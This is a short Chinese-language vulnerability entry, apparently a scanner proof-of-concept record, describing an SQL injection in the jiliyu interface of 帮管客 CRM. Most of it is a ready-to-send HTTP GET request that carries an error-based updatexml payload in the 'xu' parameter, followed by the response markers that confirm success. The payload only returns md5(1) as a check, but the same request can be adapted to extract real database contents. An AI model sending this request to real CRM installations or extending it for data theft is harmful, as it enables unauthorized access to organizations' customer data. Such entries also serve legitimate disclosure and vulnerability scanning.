﻿# 帮管客 CRM jiliyu接口 SQL注入漏洞

> 更新时间：2024-04-16

> 漏洞编号：

> 漏洞说明：帮管客CRM是一款基于互联网的客户关系管理软件,主要用于帮助企业管理客户关系、提高销售效率、优化营销策略等。其jiliyu接口存在SQl注入漏洞，攻击者可使用此漏洞通过报错注入获取到数据库数据。

> 漏洞特征：

> 验证脚本：HTTP

```
GET /index.php/jiliyu?keyword=1&page=1&pai=id&sou=soufast&timedsc=123&xu=and%201=(updatexml(1,concat(0x7e,(select%20md5(1)),0x7e),1)) HTTP/1.1
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
```

> 响应代码特征：200

> 响应内容特征：a0b923820dcc509a

> 上传文件定位：

> 验证文件来源：帮管客 CRM jiliyu接口 SQL注入漏洞.poc

